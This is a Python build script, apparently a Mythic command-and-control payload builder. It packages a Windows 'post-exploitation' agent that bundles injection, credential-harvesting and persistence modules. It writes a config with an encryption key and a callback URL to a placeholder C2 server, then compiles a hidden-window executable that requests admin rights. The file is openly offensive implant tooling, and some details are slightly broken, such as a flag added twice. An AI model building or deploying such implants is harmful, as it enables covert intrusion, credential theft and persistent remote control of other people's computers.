import os
import json
import base64
import shutil
import subprocess
from mythic_container.PayloadBuilder import *
from mythic_container.MythicRPC import *

class IGIDIRBuilder(PayloadBuilder):
    name = "igidir"
    supported_os = [SupportedOS.Windows]
    wrapper = False
    wrapped_payloads = []
    note = "IGIDIR Agent - Advanced Post-Exploitation Toolkit"
    supports_dynamic_loading = False
    build_parameters = [
        BuildParameter(
            name="architecture",
            parameter_type=BuildParameterType.ChooseOne,
            choices=["x64", "x86"],
            default_value="x64",
            description="Target architecture"
        ),
        BuildParameter(
            name="debug",
            parameter_type=BuildParameterType.Boolean,
            default_value=False,
            description="Include debug information"
        ),
    ]
    
    async def build(self) -> BuildResponse:
        resp = BuildResponse(status=BuildStatus.Success)
        
        try:
            # Get build parameters
            arch = self.get_parameter("architecture")
            debug = self.get_parameter("debug")
            
            # Create build directory
            build_dir = os.path.join(self.agent_code_path, "build")
            os.makedirs(build_dir, exist_ok=True)
            
            # Copy agent files to build directory
            agent_files = [
                "main.py",
                os.path.join("crypto", "aes.py"),
                os.path.join("crypto", "rsa.py"),
                os.path.join("capabilities", "injection.py"),
                os.path.join("capabilities", "credential_harvesting.py"),
                os.path.join("capabilities", "persistence.py"),
            ]
            
            for file in agent_files:
                src = os.path.join(self.agent_code_path, file)
                dst = os.path.join(build_dir, os.path.basename(file))
                shutil.copy2(src, dst)
            
            # Generate config
            config = {
                "aes_key": base64.b64encode(os.urandom(32)).decode('utf-8'),
                "rsa_pub_key": "-----BEGIN PUBLIC KEY-----\n...\n-----END PUBLIC KEY-----",
                "callback_interval": 10,
                "callback_url": "http://[C2_SERVER]/callback"
            }
            
            with open(os.path.join(build_dir, "config.json"), 'w') as f:
                json.dump(config, f)
            
            # Compile to executable
            output_path = os.path.join(self.payload_output_path, f"igidir_{arch}.exe")
            
            pyinstaller_cmd = [
                "pyinstaller",
                "--onefile",
                "--noconsole",
                f"--distpath={self.payload_output_path}",
                f"--name=igidir_{arch}",
                "--clean",
            ]
            
            if arch == "x64":
                pyinstaller_cmd.append("--uac-admin")
            
            if not debug:
                pyinstaller_cmd.append("--noconsole")
            
            pyinstaller_cmd.append(os.path.join(build_dir, "main.py"))
            
            process = await asyncio.create_subprocess_exec(
                *pyinstaller_cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            
            if process.returncode != 0:
                resp.status = BuildStatus.Error
                resp.payload = None
                resp.build_stderr = stderr.decode()
                resp.build_stdout = stdout.decode()
                return resp
            
            resp.payload = output_path
            resp.build_message = "Successfully built IGIDIR agent"
            
        except Exception as e:
            resp.status = BuildStatus.Error
            resp.build_stderr = str(e)
        
        return resp